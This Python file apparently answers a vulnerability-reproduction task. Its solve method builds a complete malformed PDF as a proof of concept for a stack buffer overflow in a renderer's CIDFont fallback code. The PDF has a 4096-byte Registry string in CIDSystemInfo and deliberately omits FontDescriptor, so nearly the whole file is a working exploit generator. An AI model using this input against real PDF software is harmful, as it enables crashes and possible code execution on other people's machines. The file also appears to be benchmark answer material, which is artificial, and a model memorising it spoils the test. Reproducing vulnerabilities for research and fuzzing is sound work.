import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability.
        The vulnerability exists in the CIDFont fallback mechanism where a fixed-size
        stack buffer is used to construct '<Registry>-<Ordering>' string from CIDSystemInfo.
        """
        
        # Payload: A large string for the Registry field to overflow the stack buffer.
        # The vulnerable buffer is typically 256 bytes. 4096 bytes is sufficient to crash.
        payload_size = 4096
        payload = b"A" * payload_size
        
        # PDF Header
        header = b"%PDF-1.4\n"
        
        # Objects list
        objects = []
        
        # Object 1: Catalog
        objects.append(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
        
        # Object 2: Pages Dictionary
        objects.append(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
        
        # Object 3: Page Object
        # Defines resources including the vulnerable font
        objects.append(
            b"3 0 obj\n"
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] "
            b"/Resources << /Font << /F1 4 0 R >> >> "
            b"/Contents 5 0 R >>\n"
            b"endobj\n"
        )
        
        # Object 4: Type0 Font Dictionary
        # References the CIDFont (Obj 6)
        objects.append(
            b"4 0 obj\n"
            b"<< /Type /Font /Subtype /Type0 /BaseFont /PoCFont "
            b"/Encoding /Identity-H /DescendantFonts [6 0 R] >>\n"
            b"endobj\n"
        )
        
        # Object 5: Content Stream
        # Use the font to ensure processing occurs
        stream_data = b"BT /F1 12 Tf (Trigger) Tj ET"
        objects.append(
            b"5 0 obj\n"
            b"<< /Length " + str(len(stream_data)).encode() + b" >>\n"
            b"stream\n" + stream_data + b"\nendstream\n"
            b"endobj\n"
        )
        
        # Object 6: CIDFont Dictionary
        # Critically, we omit /FontDescriptor to force the fallback mechanism
        # which utilizes the CIDSystemInfo to construct the font name.
        objects.append(
            b"6 0 obj\n"
            b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /PoCCIDFont "
            b"/CIDSystemInfo 7 0 R >>\n"
            b"endobj\n"
        )
        
        # Object 7: CIDSystemInfo Dictionary
        # Contains the overflow payload in the Registry string.
        # The constructed name will be "AAAAAAAAAAAAAAAA...-Japan1"
        objects.append(
            b"7 0 obj\n"
            b"<< /Registry (" + payload + b") /Ordering (Japan1) /Supplement 0 >>\n"
            b"endobj\n"
        )
        
        # Construct the body and calculate offsets for XRef
        body = b""
        offsets = []
        current_offset = len(header)
        
        for obj in objects:
            offsets.append(current_offset)
            body += obj
            current_offset += len(obj)
            
        # XRef Table
        # 0 8 means 8 entries starting from 0
        xref = b"xref\n0 8\n0000000000 65535 f \n"
        for offset in offsets:
            # Each entry must be exactly 20 bytes
            xref += f"{offset:010} 00000 n \n".encode()
            
        # Trailer
        trailer = (
            b"trailer\n"
            b"<< /Size 8 /Root 1 0 R >>\n"
            b"startxref\n"
            + str(current_offset).encode() + b"\n"
            b"%%EOF\n"
        )
        
        return header + body + xref + trailer